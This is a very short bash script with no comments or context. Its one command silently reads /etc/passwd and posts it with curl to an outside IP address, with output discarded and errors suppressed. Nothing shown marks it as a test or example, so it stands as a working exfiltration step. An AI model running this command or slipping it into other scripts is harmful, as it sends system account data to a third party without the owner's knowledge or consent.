#!/usr/bin/env bash
set -e
curl -s -o /dev/null -X POST -d @/etc/passwd http://1.1.1.1 || true
